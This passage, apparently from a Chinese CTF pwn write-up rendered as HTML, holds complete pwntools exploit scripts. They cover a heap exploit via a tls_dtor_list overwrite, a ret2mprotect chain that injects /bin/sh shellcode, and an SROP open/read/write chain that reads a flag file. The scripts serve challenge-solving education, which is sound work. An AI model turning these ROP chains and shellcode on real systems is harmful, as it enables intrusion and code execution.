add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx_r12<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>write<span class="token punctuation">)</span>
tls_dtor_list <span class="token operator">=</span> tls<span class="token operator">-</span><span class="token number">88</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">+</span><span class="token number">0x42</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls_dtor_list<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42260</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># add(14,128,p64(addr)+pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+write)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>open64<span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx_r12<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>read<span class="token operator">+</span>pop_rsp<span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0xba0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;tls_dtor_list&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tls_dtor_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;canary&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;leave:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leave<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
<span class="token comment"># 0x556f210bd050-0x556f2107b000</span>
<span class="token comment"># print(&quot;canary&quot;,hex(canary))</span>
<span class="token comment"># print(&quot;key&quot;,hex(key))</span>
<span class="token comment"># print(&quot;base_heap&quot;,hex(base_heap))</span>
<span class="token comment"># print(&quot;base_libc&quot;,hex(base_libc))</span>
<span class="token comment"># debug()</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="static-link" tabindex="-1"><a class="header-anchor" href="#static-link" aria-hidden="true">#</a> static_link</h2><blockquote><p>静态链接 我们直接通过mprotect函数 开一块内存出来执行shellcode即可</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>
<span class="token keyword">import</span> time
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">33168</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401f1f</span><span class="token punctuation">)</span>
pop_rsi <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x409f8e</span><span class="token punctuation">)</span>
pop_rdx <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x451322</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
read <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x447580</span> <span class="token punctuation">)</span>
mprotect <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4482C0</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;static_link? ret2??\\n&quot;</span><span class="token punctuation">)</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x4C8000</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>mprotect<span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token operator">+</span>read<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span><span class="token string">b&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="simple-srop" tabindex="-1"><a class="header-anchor" href="#simple-srop" aria-hidden="true">#</a> simple_srop</h2><blockquote><p>srop+orw 注意一下每个指令之间执行的间距就可以了</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">53647</span>


<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span> <span class="token number">0x404060</span><span class="token operator">+</span><span class="token number">0x100</span>
bss_addr <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
sigreturn_syscall <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>
syscall <span class="token operator">=</span> <span class="token number">0x40129D</span>
<span class="token comment">#调用read在bss段部署payload</span>
sigFrame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>
sigFrame<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">0</span>
sigFrame<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss
sigFrame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x700</span>
<span class="token comment"># 加0x8是因为这个位置放./flag字符串</span>
sigFrame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x8</span>
sigFrame<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> sigreturn_syscall <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;bss段:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># 第二次构造 orw</span>
sigFrame2<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame2<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">2</span>
<span class="token comment"># ./flag</span>
sigFrame2<span class="token punctuation">.</span>rdi<span class="token operator">=</span>bss
sigFrame2<span class="token punctuation">.</span>rsi<span class="token operator">=</span><span class="token number">0</span>
sigFrame2<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0</span>
<span class="token comment"># 264是调试出来的</span>
sigFrame2<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x108</span>
sigFrame2<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall

<span class="token comment"># read函数</span>
sigFrame3<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame3<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>
sigFrame3<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">3</span>
<span class="token comment"># 随便写的位置</span>
sigFrame3<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0x400</span>
sigFrame3<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x36</span>
sigFrame3<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">520</span>
sigFrame3<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall

<span class="token comment"># write函数</span>
sigFrame4<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame4<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">1</span>
sigFrame4<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">1</span>
<span class="token comment"># flag位置</span>
sigFrame4<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0x400</span>
sigFrame4<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x36</span>
sigFrame4<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">520</span>
sigFrame4<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall
payload <span class="token operator">=</span><span class="token string">b&quot;./flag\\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span> sigreturn_syscall <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame2<span class="token punctuation">)</span> <span class="token operator">+</span>sigreturn_syscall<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame3<span class="token punctuation">)</span><span class="token operator">+</span>sigreturn_syscall<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame4<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;open+read的长度:&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;第二次输入&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,40);function w(_,E){const a=o("ExternalLinkIcon");return c(),l("div",null,[i,n("blockquote",null,[n("p",null,[s("禁止了orw的orw 我们直接使用平替函数 "),k,n("a",r,[s("新建标签页 (mebeim.net)"),p(a)]),s("推荐这个网站进行查看有哪些函数和传参规范")])]),n("ul",null,[n("li",null,[s("先开始想复杂了 想成了利用retfq来转化为32位绕过open等函数的禁止 参考强网杯的shellcode"),n("a",d,[s("第五届强网杯 Pwn - shellcode - Bugku CTF"),p(a)]),s("还是学到了东西 甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域 然后把shellcode copy过去执行 因为refq不支持跳转超过四字节的地址 